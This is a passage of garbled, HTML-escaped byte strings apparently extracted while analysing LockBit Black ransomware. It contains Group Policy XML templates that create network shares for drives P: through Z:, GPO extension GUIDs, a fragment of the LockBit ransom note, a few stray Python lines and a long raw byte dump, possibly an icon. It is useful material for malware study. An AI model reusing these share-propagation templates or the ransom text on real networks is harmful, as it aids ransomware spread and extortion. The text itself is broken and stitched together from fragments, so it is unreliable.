allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_P&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_P&#34; path=&#34;P:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_Q&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_Q&#34; path=&#34;Q:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_R&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_R&#34; path=&#34;R:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_S&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_S&#34; path=&#34;S:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_T&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_T&#34; path=&#34;T:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_U&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_U&#34; path=&#34;U:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_V&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_V&#34; path=&#34;V:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_W&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_W&#34; path=&#34;W:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_X&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_X&#34; path=&#34;X:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_Y&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_Y&#34; path=&#34;Y:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_Z&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_Z&#34; path=&#34;Z:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n&lt;/NetworkShareSettings&gt; r n&#39; b&#39;[{00000000-0000-0000-0000-000000000000}{3BAE7E51-E3F4-41D0-853D-9BB9FD47605F}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{7150F9BF-48AD-4DA4-A49C-29EF4A8369BA}{3BAE7E51-E3F4-41D0-853D-9BB9FD47605F}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]&#39; b&#39;[{00000000-0000-0000-0000-000000000000}{BFCBBEB0-9DF4-4C0C-A728-434EA66A0373}{CC5746A9-9B74-4BE5-AE2E-64379C86E0E4}][{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{6A4C88C6-C502-4F74-8F60-2CB23EDC24E2}{BFCBBEB0-9DF4-4C0C-A728-434EA66A0373}][{91FBB303-0CD5-4055-BF42-E512A681B325}{CC5746A9-9B74-4BE5-AE2E-64379C86E0E4}]&#39; ** PE file . len(b&#39;LockBit Black r n r nAll your important files are stolen and encrypted! r nYou must find %s file r nand follow the instructi&#39;) . 116 . data = &#39;1&#39; 8 - len(data) % 8 . 7 . open(&#39;/tmp/something.bin&#39;,&#39;wb&#39;).write(b&#39; x00 x00 x01 x00 x03 x0000 x00 x00 x01 x00 x00 xa8% x00 x006 x00 x00 x00 x00 x00 x01 x00 x00 xa8 x10 x00 x00 xde% x00 x00 x10 x10 x00 x00 x01 x00 x00h x04 x00 x00 x866 x00 x00( x00 x00 x000 x00 x00 x00` x00 x00 x00 x01 x00 x00 x00 x00 x00 x00 x80% x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xaa xaa xaa x00 x00 x00 x00 x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 x00 x00 x00 x03 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x01 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xc3 xc3 xc3 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x01 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x03 xff xff xff x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xd0 xd0 xd0 x00 xff xff xffP xff xff xff x85 xff xff xff x86 xff xff xff x87 xff xff xff x87 xff xff xff x87 xff xff xff x87 xff xff xff x87 xff xff xff x87 xff xff xff x87 xff xff xff x87 xff xff xff x87 xff xff xff x87 xff xff xff x87 xff xff xff x87 xff xff xff x87 xff xff xff x86 xff xff xff x81 xff xff xff x87 xff xff xff x87 xff xff xff x87 xff xff xff x87 xff xff xff x87 xff xff xff x84 xff xff xff x83 xff xff xff x87 xff xff xff x87 xff xff xff x87 xff xff xff x86 xff xff xff x86 xff xff xffb x00 x00 x00 x00 xf9 xf9 xf9 x08 xe4 xe4 xe0 x19 xcd xcd xcd x0c xa8 xa8 xa8 x00 xfb xfb xfb x00 xfd xfd xfd x00 xff xff xff x02 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x03 x00 x00 x00 x00 xed xed xed x1a xff xff xff xfc xcf xcf xcf xff xc2 xc2 xc3 xff xc5 xc5 xc6 xff xc6 xc6 xc6 xff xc6 xc5 xc6 xff xc6 xc5 xc6 xff xc6 xc5 xc6 xff xc6 xc5 xc6 xff xc6 xc5 xc6 xff xc6 xc5 xc6 xff xc6 xc5 xc6 xff xc6 xc5 xc6 xff xc6 xc5 xc6 xff xc6 xc6 xc7 xff xc2 xc1 xc2 xff xc6 xc6 xc6 xff xed xed xed xff xc3 xc3 xc3 xff xc4 xc4 xc5 xff xc4 xc3 xc4 xff xc6 xc6 xc7 xff xb9 xb9 xb9 xff xdf xdf xe0 xff xdb xdb xdb xff xc0 xc0 xc1 xff xc4 xc4 xc5 xff xc5 xc5 xc6 xff xc3 xc3 xc4 xff xc4 xc4 xc5 xff xfd xfd xfd xff xfd xfd xfdp xff xff xff xd4 xff xff xff xf1 xff xff xff xe1 xff xff xff xa6 xff xff xff] xf7 xf7 xf7 x05 xfe xfe xfe x00 xff xff xff x03 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 xff xff xff&amp; xff xff xff xf8+*+ xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfbyy{ xfb=== xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb## &#39; xfb x82 x82 x88 xfb r r r xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x00 x00 x00 xfb x94 x94 x95 xfb xfb xfb xfb xfa xff xff xff xff xbc xbc xbd xffONS xff x82 x82 x88 xff xc0 xc0 xc0 xff xfb xfa xfb xff xff xff xff xcc xfc xfc xfcT xfe xfe xfe x00 xff xff xff x02 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x03 x00 x00 x00 x00 xf9 xf9 xf9$ xff xff xff xf9554 xff x02 x02 x02 xfe x0e x0e x0e xff))* xff*)* xff**+ xff**+ xff**+ xff**+ xff**+ xff**+ xff**+ xff**+ xff//0 xff x83 x82 x84 xffIIJ xff x00 x00 x00 xff x02 x02 x02 xff x04 x04 x04 xff x00 x00 x00 xff//3 xff x90 x90 x97 xff x15 x15 x16 xff x00 x00 x00 xff x04 x04 x04 xff x02 x02 x01 xff x05 x05 x05 xff x9f x9f xa0 xfe xff xff xff xff xff xff xff xff xdb xdb xdb xfd x1e x1e x1e xfc x00 x00 x00 xfe x00 x00 x00 xfd x00 x00 x00 xfb88&lt; xfa xac xab xb0 xff xff xff xff xff xfb xfb xfc x81 xfc xfc xfc x00 xff xff xff x02 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 xfb xfb xfb% xff xff xff xfa666 xff x00 x00 x00 xffccd xff x87 x87 x88 xffeef xffkkl xfflll xfflll xfflll xfflll xfflll xffkkl xffjjj xffqqr xff;;; xff x00 x00 x00 xff x04 x04 x04 xff x03 x03 x03 xff x00 x00 x00 xff//3 xff x90 x90 x98 xff x13 x13 x14 xff x00 x00 x00 xff x04 x04 x04 xfe x00 x00 x00 xff n n n xfd xb4 xb4 xb5 xfd xff xff xff xff xff xff xff xfe xc5 xc5 xc5 xfejjj xfeuuw xff~~ x80 xfeccc xff x17 x17 x17 xfe x00 x00 x00 xff x00 x00 x00 xfcqqq xfa xfe xfe xfe xff xf7 xf7 xf7u xfd xfd xfd x00 xff xff xff x02 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 xfb xfb xfb% xff xff xff xfa777 xff x00 x00 x00 xffggh xff&amp;&amp;&amp; xff x00 x00 x00 xff x00 x00 x00 xff x00 x00 x00 xff x00 x00 x00 xff x00 x00 x00 xff x00 x00 x00 xff x00 x00 x00 xff x00 x00 x00 xff x00 x00 x00 xff x00 x00 x00 xff x00 x00 x00 xff x00 x00 x00 xff x00 x00 x00 xff x00 x00 x00 xff( &#39;* xff x87 x86 x8e xff n n n xff x00 x00 x00 xff x00 x00 x00 xfe x00 x00 x00 xff x07 x07 x07 xfd xba xb9 xba xff xff xff xff xff xfd xfd xfd xff xbb xbb xbb xff x06 x06 x06 xff x00 x00 x00 xff x00 x00 x00 xff x12 x12 x13 xffEEE xff x88 x88 x8c xffEEM xfe x00 x00 x00 xff x00 x00 x00 xfd x8a x8a x8c xfa xff xff xff xf2 xeb xeb xeb! x00 x00 x00 x00 xff xff xff x01 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 xfb xfb xfb% xff xff xff xfa666 xff x00 x00 x00 xffffg xff/// xff x04 x04 x04 xfe x1f x1f xff*** xfe+++ xfd+++ xfd))) xfd))) xfd))) xfd))) xfd))) xfd((( xfd &#39; &#39; &#39; xfd### xfd&gt;=@ xfd xa5 xa4 xae xfc444 xfd&quot;&quot;&quot; xfd &#39; &#39; &#39; xfd%%% xfd+++ xfc xb9 xb9 xb9 xff xff xff xff xe4 xfb xfb xfb xe0 xd7 xd6 xd9 xfc323 xfc+++ xfd&quot;&quot;&quot; xfb x00 x00 x00 xfc x00 x00 x00 xfe x00 x00 x00 xfe x07 x07 t xfe x86 x84 x96 xff88= xfe x00 x00 x00 xff x04 x04 t xfa xe0 xe0 xe3 xff xfe xfe xfe x8c x00 x00 x00 x00 xff xff xff x03 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 xfb xfb xfb% xff xff xff xfa777 xff x00 x00 x00 xffkjk xffBBB xff x00 x00 x00 xff xb3 xb3 xb3 xff xf9 xf9 xf9 xff xf4 xf4 xf4 xff xf7 xf7 xf7 xff xf8 xf8 xf8 xff xf8 xf8 xf8 xff xf8 xf8 xf8 xff xf8 xf8 xf8 xff xf8 xf8 xf8 xff xf8 xf8 xf8 xff xf8 xf8 xf8 xff xf6 xf6 xf6 xff xff xfe xff xff xf9 xf9 xf9 xff xf3 xf3 xf3 xff xf9 xf9 xf9 xff xf8 xf8 xf8 xff xf7 xf7 xf7 xff xfa xfa xfa xff xff xff xff xee xfb xfb xfb. xff xff xff x9b xf5 xf5 xf6 xff xf7 xf7 xf7 xff xfb xfb xfb xff xf0 xf0 xf0 xff xbf xbf xbf xffGFG xfd x00 x00 x00 xff x00 x00 x00 xff r r x0e xff x85 x84 x8a xff x08 x08 x08 xfe x00 x00 x00 xfd x90 x90 x90 xfe xff xff xff xda xb9 xb9 xb9 x07 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 xfb xfb xfb% xff xff xff xfa333 xff x00 x00 x00 xff x19 x19 x19 xff x8f x8e x8f xff x1e x1e x1f xfa xae xae xae xff xff xff xff xaa xff xff xff0 xff xff xff5 xff xff xff1 xff xff xff1 xff xff xff1 xff xff xff1 xff xff xff1 xff xff xff1 xff xff xff1 xff xff xff1 xff xff xff4 xff xff xffA xff xff xff1 xff xff xff1 xff xff xff1 xff xff xff1 xff xff xff1 xf4 xf4 xf4 x18 x00 x00 x00 x00 xfe xfe xfe x11 xff xff xffB xff xff xff1 xff xff xff1 xff xff xffP xff xff xff xbb xff xff xff xffXXX xfd x00 x00 x00 xfe x00 x00 x00 xfeget xff;;? xff x00 x00 x00 xfeXWZ xff xff xff xff xee xc8 xc8 xc6 x12 x00 x00 x00 x00 xff xff xff x01 xff xff xff x04 x00 x00 x00 x00 xfb xfb xfb% xff xff xff xfa222 xff x00 x00 x00 xff x00 x00 x00 xff x1a x1a x1a xff}}~ xf9 xd2 xd2 xd2 xff xfd xfd xfd x91 xfe xfe xfe x00 xfe xfe xfe x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x02 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xfb xfb xfb x00 xfe xfe xfe x00 xf8 xf7 xf8 x00 xff xff xff x9c xe7 xe8 xe8 xff x12 x12 x13 xfb x00 x00 x00 xffBBH xff[Z_ xff x00 x00 x00 xfeBBC xfd xff xff xff xfc xf6 xf6 xf50 x00 x00 x00 x00 xff xff xff x04 xff xff xff x04 x00 x00 x00 x00 xfa xfa xfa$ xff xff xff xf9444 xff x00 x00 x00 xfe x04 x04 x04 xff x00 x00 x00 xff x0f x0f x0f xfa xd9 xd9 xd9 xff xfe xfe xfe x93 xfe xfe xfe x02 xff xff xff x06 xff xff xff x02 xff xff xff x02 xff xff xff x02 xff xff xff x02 xff xff xff x02 xff xff xff x02 xff xff xff x02 xff xff xff x02 xff xff xff x02 xff xff xff x02 xff xff xff x02 xff xff xff x02 xff xff xff x02 xff xff xff x02 xff xff xff x02 x00 x00 x00 x01 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x02 xff xff xff x02 xff xff xff x02 xfe xfe xfe x04 xff xff xff x01 xed xed xed&amp; xff xff xff xfbMMN xfd x00 x00 x00 xfe553 xffeee xff x00 x00 x00 xff=== xfc xff xff xff xff xfa xfa xfa: x00 x00 x00 x00 xff xff xff x05 xff xff xff x04 x00 x00 x00 x00 xfc xfc xfc% xff xff xff xfa*** xff x01 x01 x01 xff x01 x01 x01 xff x03 x03 x03 xff x00 x00 x00 xfa xb2 xb2 xb2 xff xff xff xff x96 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x01 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xfe xfe xfe x00 x00 x00 x00 x00 xef xef xef$ xff xff xff xfcHHH xfd x00 x00 x00 xfe:9&lt; xffccf xff x00 x00 x00 xfeHHI xfe xff xff xff xf5 xec xec xeb x1f x00 x00 x00 x00 xff xff xff x02 xff xff xff x04 x00 x00 x00 x00 xee xee xee&quot; xff xff xff xf8^^^ xff x00 x00 x00 xfe x04 x04 x04 xff x01 x01 x01 xff x00 x00 x00 xfa xb8 xb8 xb8 xff xff xff xff x95 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x02 x00 x00 x00 x00III x00 x00 x00 x00 x04 x14 x14 x14 x04 x11 x11 x11 x04 x11 x11 x11 x04 x11 x11 x11 x04 x11 x11 x11 x04 x11 x11 x11 x04 x11 x11 x11 x04 x12 x12 x11 x04 xed xed xed x04 xfa xfa xfa x06 xf6 xf5 xf5 xff xff xff xb0 xe6 xe6 xe7 xfe x11 x11 x11 xfc x00 x00 x00 xff[Z^ xffHHM xff x00 x00 x00 xfe^^_ xff xff xff xff xea xc4 xc4 xc3 x10 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 xf7 xf7 xf7# xf5 xf5 xf5 xf9 xa4 xa3 xa4 xffJJJ xfe x00 x00 x00 xff x05 x05 x05 xff x00 x00 x00 xfa xb8 xb8 xb8 xff xff xff xff x96 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x02 x00 x00 x00 x00 xfc xfc xfc1 xff xff xff xc5 xff xff xff xd9 xff xff xff xda xff xff xff xdb xff xff xff xdb xff xff xff xdb xff xff xff xdb xff xff xff xdb xff xff xff xdb xff xff xff xdb xff xff xff xdc xff xff xff xdb xff xff xff xf4 xe9 xe9 xeb xffKKL xfe x00 x00 x00 xff x04 x05 x03 xfe x87 x87 x87 xff x10 x10 x0f xfe x00 x00 x00 xfd x83 x83 x83 xfe xff xff xff xdf xb7 xb7 xb7 t x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x04 x00 x00 x00 x00 xfd xfd xfd% xfd xfd xfd xfa))* xffoop xffTTT xff x00 x00 x00 xff x01 x01 x01 xfa xb7 xb7 xb7 xff xff xff xff x96 x00 x00 x00 x00 xff xff xff 